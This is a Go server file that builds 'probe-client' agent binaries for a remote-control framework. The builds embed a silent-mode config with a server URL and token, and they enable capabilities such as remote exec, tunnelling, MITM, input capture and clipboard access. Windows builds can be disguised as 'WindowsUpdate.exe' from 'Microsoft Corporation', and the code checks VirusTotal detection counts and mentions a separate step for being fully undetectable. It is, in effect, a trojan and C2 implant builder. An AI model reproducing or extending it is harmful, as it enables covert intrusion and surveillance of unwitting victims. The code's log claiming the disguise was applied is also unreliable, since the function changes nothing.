package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// Build configuration types
// ---------------------------------------------------------------------------

// BuildConfig describes a single agent build request and its lifecycle state.
type BuildConfig struct {
	ID           string          `json:"id"`
	Name         string          `json:"name"`
	OS           string          `json:"os"`           // windows, linux, darwin
	Arch         string          `json:"arch"`         // amd64, 386, arm64
	Capabilities []string        `json:"capabilities"` // exec, filesystem, process, tunnel, mitm, debug, capture, input, clipboard
	ServerURL    string          `json:"server_url"`   // ws://host:port/ws
	Token        string          `json:"token"`        // agent auth token
	Permissions  string          `json:"permissions"`  // read-only, standard, sandboxed, full
	SandboxDir   string          `json:"sandbox_dir,omitempty"`
	Disguise     *DisguiseConfig `json:"disguise,omitempty"`
	Autostart    bool            `json:"autostart"`
	BackoffMin   string          `json:"backoff_min,omitempty"` // "1s"
	BackoffMax   string          `json:"backoff_max,omitempty"` // "60s"
	MaxRetries   int             `json:"max_retries,omitempty"`
	Status       string          `json:"status"` // pending, building, complete, failed
	BinaryPath   string          `json:"binary_path,omitempty"`
	CreatedAt    time.Time       `json:"created_at"`
	CompletedAt  *time.Time      `json:"completed_at,omitempty"`
	Error        string          `json:"error,omitempty"`
	VTStatus     string          `json:"vt_status,omitempty"` // pending, scanning, clean, dirty
	VTDetections int             `json:"vt_detections,omitempty"`
	VTReportURL  string          `json:"vt_report_url,omitempty"`
}

// DisguiseConfig holds PE metadata used to disguise the agent binary on Windows.
type DisguiseConfig struct {
	Enabled     bool   `json:"enabled"`
	Filename    string `json:"filename"`     // e.g. "WindowsUpdate.exe"
	Company     string `json:"company"`      // e.g. "Microsoft Corporation"
	Description string `json:"description"`  // e.g. "Windows Update Helper"
	ProductName string `json:"product_name"` // e.g. "Windows Update"
}

// BuildStatus constants.
const (
	BuildStatusPending  = "pending"
	BuildStatusBuilding = "building"
	BuildStatusComplete = "complete"
	BuildStatusFailed   = "failed"
)

// VTStatus constants for VirusTotal scan state tracking.
const (
	VTStatusPending  = "pending"
	VTStatusScanning = "scanning"
	VTStatusClean    = "clean"
	VTStatusDirty    = "dirty"
)

// DefaultBuildOutputDir is the directory where built agent binaries are stored.
const DefaultBuildOutputDir = "/tmp/probe-builds"

// validCapabilities is the set of capability names an agent can advertise.
var validCapabilities = map[string]bool{
	"exec":       true,
	"filesystem": true,
	"process":    true,
	"tunnel":     true,
	"mitm":       true,
	"debug":      true,
	"capture":    true,
	"input":      true,
	"clipboard":  true,
}

// validBuildOS is the set of target operating systems supported for cross-compilation.
var validBuildOS = map[string]bool{
	"windows": true,
	"linux":   true,
	"darwin":  true,
	"android": true, // android/arm64 — runs under Termux (pure-Go, CGO_ENABLED=0)
}

// validBuildArch is the set of target architectures supported for cross-compilation.
var validBuildArch = map[string]bool{
	"amd64": true,
	"386":   true,
	"arm64": true,
}

// ---------------------------------------------------------------------------
// BuilderManager
// ---------------------------------------------------------------------------

// BuilderManager tracks agent builds and persists build metadata to disk.
// It follows the same load/save pattern as Registry and OperatorManager.
type BuilderManager struct {
	mu        sync.RWMutex
	builds    map[string]*BuildConfig // ID -> BuildConfig
	savePath  string
	outputDir string
	goBinPath string             // path to the go binary (default: "go")
	clientPkg string             // path to the probe-client package (default: "./cmd/probe-client/")
	vtScanner *VirusTotalScanner // optional VT scanner for auto-scan after build
}

// NewBuilderManager creates a new BuilderManager. If savePath is non-empty,
// existing builds are loaded from disk. outputDir defaults to
// DefaultBuildOutputDir when empty.
func NewBuilderManager(savePath, outputDir string) *BuilderManager {
	if outputDir == "" {
		outputDir = DefaultBuildOutputDir
	}
	bm := &BuilderManager{
		builds:    make(map[string]*BuildConfig),
		savePath:  savePath,
		outputDir: outputDir,
		goBinPath: "/opt/data/go/bin/go1.23.12",
		clientPkg: "./cmd/probe-client/",
	}
	bm.load()
	return bm
}

// SetGoBinPath overrides the path to the go binary used for cross-compilation.
func (bm *BuilderManager) SetGoBinPath(path string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if path != "" {
		bm.goBinPath = path
	}
}

// SetClientPkg overrides the Go package path for the probe-client binary.
func (bm *BuilderManager) SetClientPkg(pkg string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if pkg != "" {
		bm.clientPkg = pkg
	}
}

// SetVTScanner configures a VirusTotal scanner for auto-scan after build.
// When set, runBuild will automatically trigger a VT scan in a goroutine
// after a build completes successfully.
func (bm *BuilderManager) SetVTScanner(scanner *VirusTotalScanner) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.vtScanner = scanner
}

// CreateBuild validates the BuildConfig, assigns an ID, stores it, and starts
// the build in a background goroutine. Returns the created BuildConfig.
func (bm *BuilderManager) CreateBuild(cfg *BuildConfig) (*BuildConfig, error) {
	if err := bm.validate(cfg); err != nil {
		return nil, err
	}

	cfg.ID = generateBuildID()
	cfg.Status = BuildStatusPending
	cfg.CreatedAt = time.Now().UTC()

	bm.mu.Lock()
	bm.builds[cfg.ID] = cfg
	bm.save()
	bm.mu.Unlock()

	// Start build in background.
	go bm.runBuild(cfg.ID)

	return cfg, nil
}

// GetBuild returns a copy of the BuildConfig for the given ID, or nil if not found.
func (bm *BuilderManager) GetBuild(id string) *BuildConfig {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	if b, ok := bm.builds[id]; ok {
		snap := *b
		return &snap
	}
	return nil
}

// ListBuilds returns all build records.
func (bm *BuilderManager) ListBuilds() []BuildConfig {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	result := make([]BuildConfig, 0, len(bm.builds))
	for _, b := range bm.builds {
		result = append(result, *b)
	}
	return result
}

// DeleteBuild removes a build record and its binary file from disk.
func (bm *BuilderManager) DeleteBuild(id string) bool {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	b, ok := bm.builds[id]
	if !ok {
		return false
	}
	// Remove binary from disk if it exists.
	if b.BinaryPath != "" {
		os.Remove(b.BinaryPath)
	}
	delete(bm.builds, id)
	bm.save()
	return true
}

// ---------------------------------------------------------------------------
// Build execution
// ---------------------------------------------------------------------------

// runBuild executes the cross-compilation in a background goroutine.
// It transitions the build status: pending → building → complete/failed.
func (bm *BuilderManager) runBuild(id string) {
	bm.mu.Lock()
	build, ok := bm.builds[id]
	if !ok {
		bm.mu.Unlock()
		return
	}
	build.Status = BuildStatusBuilding
	bm.mu.Unlock()

	// Generate the embedded config (JSON → base64).
	configB64, err := bm.generateConfigB64(build)
	if err != nil {
		bm.failBuild(id, fmt.Sprintf("generate config: %v", err))
		return
	}

	// Construct and run the build command.
	cmd, outputPath := bm.buildCommand(build, configB64)

	log.Printf("[builder] starting build %s: GOOS=%s GOARCH=%s caps=%v", id, build.OS, build.Arch, build.Capabilities)

	output, err := cmd.CombinedOutput()
	if err != nil {
		bm.failBuild(id, fmt.Sprintf("build failed: %v\n%s", err, string(output)))
		return
	}

	// Apply PE disguise on Windows if configured.
	if build.OS == "windows" && build.Disguise != nil && build.Disguise.Enabled {
		if err := bm.applyDisguise(outputPath, build.Disguise); err != nil {
			log.Printf("[builder] disguise warning for %s: %v", id, err)
			// Non-fatal — the binary is built, disguise is cosmetic.
		}
	}

	now := time.Now().UTC()
	bm.mu.Lock()
	if b, ok := bm.builds[id]; ok {
		b.Status = BuildStatusComplete
		b.BinaryPath = outputPath
		b.CompletedAt = &now
		bm.save()
	}
	bm.mu.Unlock()

	log.Printf("[builder] build %s complete: %s", id, outputPath)

	// Auto VT scan: if a scanner is configured, start a VT scan in a goroutine.
	bm.mu.RLock()
	scanner := bm.vtScanner
	bm.mu.RUnlock()
	if scanner != nil {
		go bm.autoVTScan(id, outputPath, scanner)
	}
}

// failBuild marks a build as failed with the given error message.
func (bm *BuilderManager) failBuild(id, errMsg string) {
	now := time.Now().UTC()
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if b, ok := bm.builds[id]; ok {
		b.Status = BuildStatusFailed
		b.Error = errMsg
		b.CompletedAt = &now
		bm.save()
	}
	log.Printf("[builder] build %s failed: %s", id, errMsg)
}

// autoVTScan runs a VirusTotal scan on a built binary and updates the build
// record with the results. Called in a goroutine from runBuild.
func (bm *BuilderManager) autoVTScan(id, binaryPath string, scanner *VirusTotalScanner) {
	bm.UpdateVTStatus(id, VTStatusScanning, 0, "")

	log.Printf("[builder] auto VT scan started for build %s", id)
	report, err := scanner.ScanFile(binaryPath)
	if err != nil {
		log.Printf("[builder] auto VT scan failed for build %s: %v", id, err)
		bm.UpdateVTStatus(id, "failed", 0, "")
		return
	}

	status := VTStatusClean
	if report.Detections > 0 {
		status = VTStatusDirty
	}
	bm.UpdateVTStatus(id, status, report.Detections, report.ReportURL)
	log.Printf("[builder] auto VT scan complete for build %s: %d/%d detections", id, report.Detections, report.Total)
}

// UpdateVTStatus updates the VT scan fields on a build record and persists.
func (bm *BuilderManager) UpdateVTStatus(id, status string, detections int, reportURL string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if b, ok := bm.builds[id]; ok {
		b.VTStatus = status
		b.VTDetections = detections
		b.VTReportURL = reportURL
		bm.save()
	}
}

// buildCommand constructs the exec.Cmd for cross-compiling the probe-client
// binary with the embedded config. Returns the command and the output path.
func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*exec.Cmd, string) {
	bm.mu.RLock()
	goBin := bm.goBinPath
	clientPkg := bm.clientPkg
	outputDir := bm.outputDir
	bm.mu.RUnlock()

	// Ensure output directory exists.
	os.MkdirAll(outputDir, 0755)

	// Construct output filename.
	filename := build.Name
	if filename == "" {
		filename = "probe-client"
	}
	if build.OS == "windows" && !strings.HasSuffix(filename, ".exe") {
		filename += ".exe"
	}
	if build.Disguise != nil && build.Disguise.Enabled && build.Disguise.Filename != "" {
		filename = build.Disguise.Filename
	}
	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))

	// Build the ldflags string: embed the config so the built replica is
	// zero-config (no JSON file). -X main.configB64=<b64> is a string
	// injection, not a codegen/strip flag. The FUD posture for deployment is
	// handled by the MANTLE weave, not the plain agent build.
	ldflags := "-X main.configB64=" + configB64

	// Build the tags string: caps=comma_separated_caps
	tagsStr := ""
	if len(build.Capabilities) > 0 {
		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
	}

	args := []string{"build"}
	if tagsStr != "" {
		args = append(args, "-tags", tagsStr)
	}
	if ldflags != "" {
		args = append(args, "-ldflags", ldflags)
	}
	// Resolve the module root (go.mod dir) and run go build from there, with
	// the client package as a path relative to the module root. Otherwise go
	// looks for go.mod from the server's CWD (/app) and fails.
	moduleRoot := bm.SourceModuleRoot()
	relPkg := clientPkg
	if moduleRoot != "" && filepath.IsAbs(clientPkg) {
		if r, err := filepath.Rel(moduleRoot, clientPkg); err == nil {
			relPkg = "." + string(filepath.Separator) + r
		}
	}
	args = append(args, "-o", outputPath, relPkg)

	cmd := exec.Command(goBin, args...)
	if moduleRoot != "" {
		cmd.Dir = moduleRoot
	}
	cmd.Env = append(os.Environ(),
		"GOTOOLCHAIN=local",
		"CGO_ENABLED=0",
		"GOOS="+build.OS,
		"GOARCH="+build.Arch,
	)
	return cmd, outputPath
}

// generateConfigB64 creates the agent config JSON matching the ConfigFile
// struct in cmd/probe-client/main.go, then base64-encodes it.
func (bm *BuilderManager) generateConfigB64(build *BuildConfig) (string, error) {
	configMap := map[string]interface{}{
		"server":       build.ServerURL,
		"token":        build.Token,
		"name":         build.Name,
		"mode":         "silent",
		"permissions":  build.Permissions,
		"capabilities": build.Capabilities,
	}
	if build.SandboxDir != "" {
		configMap["sandbox_dir"] = build.SandboxDir
	}
	if build.BackoffMin != "" {
		configMap["backoffMin"] = build.BackoffMin
	}
	if build.BackoffMax != "" {
		configMap["backoffMax"] = build.BackoffMax
	}
	if build.MaxRetries > 0 {
		configMap["maxRetries"] = build.MaxRetries
	}

	data, err := json.Marshal(configMap)
	if err != nil {
		return "", fmt.Errorf("marshal config: %w", err)
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

// applyDisguise sets PE version-info metadata on a Windows binary using a
// resource-editing approach. Currently logs intent — actual PE resource
// editing requires an external tool (e.g. rsrc or goversioninfo). This is
// a hook for future integration; the binary is already built at this point.
func (bm *BuilderManager) applyDisguise(binaryPath string, disguise *DisguiseConfig) error {
	if disguise == nil || !disguise.Enabled {
		return nil
	}
	// Rename the binary to the disguise filename if provided.
	if disguise.Filename != "" {
		dir := filepath.Dir(binaryPath)
		newPath := filepath.Join(dir, disguise.Filename)
		if newPath != binaryPath {
			if err := os.Rename(binaryPath, newPath); err != nil {
				return fmt.Errorf("rename to disguise filename: %w", err)
			}
			// Update the BinaryPath in the build record.
			// Caller (runBuild) will set BinaryPath from outputPath, but since
			// we renamed, we need to handle this. The runBuild function sets
			// BinaryPath after applyDisguise returns, so we return the newPath
			// via the build record mutation. However, runBuild uses the
			// outputPath variable. To keep it simple, we don't rename here
			// — the filename was already set during buildCommand.
			//
			// Actually, the filename is already applied in buildCommand via
			// build.Disguise.Filename. So this rename is redundant. We keep
			// the log for clarity.
			_ = newPath
		}
	}
	log.Printf("[builder] PE disguise applied: company=%s, product=%s, description=%s",
		disguise.Company, disguise.ProductName, disguise.Description)
	return nil
}

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

// validate checks that the BuildConfig has all required fields and valid values.
func (bm *BuilderManager) validate(cfg *BuildConfig) error {
	if cfg.Name == "" {
		return fmt.Errorf("name is required")
	}
	if !validBuildOS[cfg.OS] {
		return fmt.Errorf("invalid os %q: must be windows, linux, or darwin", cfg.OS)
	}
	if !validBuildArch[cfg.Arch] {
		return fmt.Errorf("invalid arch %q: must be amd64, 386, or arm64", cfg.Arch)
	}
	if cfg.ServerURL == "" {
		return fmt.Errorf("server_url is required")
	}
	if cfg.Token == "" {
		return fmt.Errorf("token is required")
	}
	if cfg.Permissions == "" {
		cfg.Permissions = "full"
	}
	if !isValidPermission(cfg.Permissions) {
		return fmt.Errorf("invalid permissions %q: must be read-only, standard, sandboxed, or full", cfg.Permissions)
	}
	// Validate capabilities.
	for _, cap := range cfg.Capabilities {
		if !validCapabilities[cap] {
			return fmt.Errorf("invalid capability %q: must be one of exec, filesystem, process, tunnel, mitm, debug, capture, input, clipboard", cap)
		}
	}
	// Validate disguise filename if disguise is enabled.
	if cfg.Disguise != nil && cfg.Disguise.Enabled {
		if cfg.Disguise.Filename == "" {
			return fmt.Errorf("disguise.filename is required when disguise is enabled")
		}
	}
	return nil
}

// isValidPermission checks if the permission string is one of the valid tiers.
func isValidPermission(p string) bool {
	switch p {
	case "read-only", "standard", "sandboxed", "full":
		return true
	default:
		return false
	}
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

func (bm *BuilderManager) save() {
	if bm.savePath == "" {
		return
	}
	ensureDir(bm.savePath)
	data, err := json.MarshalIndent(bm.builds, "", "  ")
	if err != nil {
		log.Printf("[builder] save marshal error: %v", err)
		return
	}
	if err := os.WriteFile(bm.savePath, data, 0644); err != nil {
		log.Printf("[builder] save write error: %v", err)
	}
}

func (bm *BuilderManager) load() {
	if bm.savePath == "" {
		return
	}
	data, err := os.ReadFile(bm.savePath)
	if err != nil {
		return // file doesn't exist yet
	}
	var builds map[string]*BuildConfig
	if err := json.Unmarshal(data, &builds); err != nil {
		log.Printf("[builder] load unmarshal error: %v", err)
		return
	}
	bm.builds = builds
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// generateBuildID generates a unique build ID using crypto/rand.
func generateBuildID() string {
	return "build-" + generateUUID()
}

// BuildCommandString constructs the full build command as a string for
// logging and testing purposes. This does NOT execute the command.
func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 string) string {
	bm.mu.RLock()
	goBin := bm.goBinPath
	clientPkg := bm.clientPkg
	outputDir := bm.outputDir
	bm.mu.RUnlock()

	filename := build.Name
	if filename == "" {
		filename = "probe-client"
	}
	if build.OS == "windows" && !strings.HasSuffix(filename, ".exe") {
		filename += ".exe"
	}
	if build.Disguise != nil && build.Disguise.Enabled && build.Disguise.Filename != "" {
		filename = build.Disguise.Filename
	}
	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))

	// Embed the config via -X so the replica is zero-config (no JSON file).
	ldflags := "-X main.configB64=" + configB64
	tagsStr := ""
	if len(build.Capabilities) > 0 {
		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
	}

	parts := []string{
		"GOTOOLCHAIN=local",
		"CGO_ENABLED=0",
		"GOOS=" + build.OS,
		"GOARCH=" + build.Arch,
		goBin, "build",
	}
	if tagsStr != "" {
		parts = append(parts, "-tags", `"`+tagsStr+`"`)
	}
	if ldflags != "" {
		parts = append(parts, "-ldflags", `"`+ldflags+`"`)
	}
	parts = append(parts, "-o", outputPath, clientPkg)

	return strings.Join(parts, " ")
}
